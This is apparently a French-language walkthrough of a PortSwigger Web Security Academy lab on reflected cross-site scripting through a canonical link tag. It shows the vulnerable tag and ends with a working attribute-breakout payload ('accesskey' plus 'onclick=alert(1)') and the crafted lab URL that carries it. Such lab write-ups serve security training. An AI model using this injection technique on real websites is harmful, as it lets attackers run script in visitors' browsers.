# Lab

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

## Payload

En inspectant le code source du lab, on remarque cette balise dans le header : `<link rel="canonical" href='https://0a180012049daf4c8085093b00ca00cf.web-security-academy.net/'>`

En modifiant l'url en ajoutant par exemple `?'toto` on remarque que le lien est bien modifié.

`<link rel="canonical" href='https://0a180012049daf4c8085093b00ca00cf.web-security-academy.net/?'toto'>`

De ce fait une injection est possible. On peut donc injecter des tags html dans le lien canonical.

```html
https://0a180012049daf4c8085093b00ca00cf.web-security-academy.net/?%27accesskey=%27X%27onclick=%27alert(1)%27%20x=%27
```

Le payload est : `'accesskey='X'onclick='alert(1)' x='`